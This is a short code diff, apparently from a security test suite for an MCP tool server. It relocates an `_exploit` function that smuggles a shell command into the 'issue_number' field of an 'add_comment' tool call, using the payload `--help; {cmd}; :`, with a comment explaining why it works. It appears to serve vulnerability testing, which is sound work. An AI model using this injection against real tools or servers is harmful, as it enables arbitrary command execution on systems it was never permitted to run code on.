@@ -72,6 +72,20 @@ KEPT_PLACES = (
 )
 
 
+def _exploit(place_id: str):
+    async def run(places: Places, client: MCPClientPort) -> None:
+        await client.call_tool(
+            "add_comment",
+            {
+                "path": REPO_PATH,
+                "issue_number": _payload(_cmd_for(places[place_id])),
+                "body": "LGTM",
+            },
+        )
+
+    return run
+
+
 def _payload(cmd: str) -> str:
     # `--help` -> leading `gh ...` exits 0; `cmd` runs; `:` ignores the trailing gh flags.
     return f"--help; {cmd}; :"
@@ -93,20 +107,6 @@ def _cmd_for(place: Place) -> str:
     if kind is PlaceKind.HTTP_ENDPOINT:
         return f"curl -s --max-time 5 http://{place.coordinates.host}{place.coordinates.path}"
     raise ValueError(f"{place.id}: kind {kind} has no command-execution exploit")
-
-
-def _exploit(place_id: str):
-    async def run(places: Places, client: MCPClientPort) -> None:
-        await client.call_tool(
-            "add_comment",
-            {
-                "path": REPO_PATH,
-                "issue_number": _payload(_cmd_for(places[place_id])),
-                "body": "LGTM",
-            },
-        )
-
-    return run
 
 
 async def _benign(places: Places, client: MCPClientPort) -> None:
